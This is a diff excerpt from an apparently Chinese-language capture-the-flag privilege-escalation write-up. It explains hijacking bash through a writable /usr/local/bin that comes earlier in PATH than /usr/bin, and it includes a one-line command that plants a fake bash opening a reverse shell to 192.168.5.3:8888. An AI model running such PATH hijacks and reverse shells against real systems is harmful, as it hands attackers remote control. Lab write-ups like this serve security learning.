@@ -67,7 +67,7 @@ other::---
 
 在 /home/matthieu/中发现一个脚本 StaleFinder ，其中的 echo 没有使用全局路径，在 /usr/bin 中有 echo，但是 /usr/local/bin 这个在 PATH 中比/usr/bin 位置靠前，可以进行命令劫持。
 
-盲猜 StaleFinder 脚本应该是某个用户执行的定时任务，这里看到第一行 #!/usr/bin/env bash ，会从 path 中查找 bash，这里可以劫持 bash 命令：
+盲猜 StaleFinder 脚本应该是某个用户执行的定时任务，这里看到第一行 #!/usr/bin/env bash ，会从 path 环境变量中查找 bash ，然后在用这个 bash 执行解析脚本。这里利用上面的/usr/local/bin 可写，可以劫持 bash 命令：
 
 ```
 echo -e '#!/bin/bash\n/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"' > /usr/local/bin/bash
